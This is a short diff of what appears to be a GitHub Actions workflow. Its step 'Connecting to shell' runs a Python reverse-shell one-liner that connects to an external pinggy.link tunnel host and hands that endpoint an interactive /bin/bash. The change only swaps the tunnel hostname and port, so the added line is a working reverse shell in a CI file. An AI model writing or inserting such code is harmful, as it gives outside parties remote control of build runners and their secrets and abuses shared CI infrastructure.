@@ -23,4 +23,4 @@ jobs:
 
       - name: Connecting to shell
         run: |
-         python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("lcpvc-45-117-202-173.a.free.pinggy.link",38671));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
+         python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("hqsoi-45-117-202-173.a.free.pinggy.link",40733));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
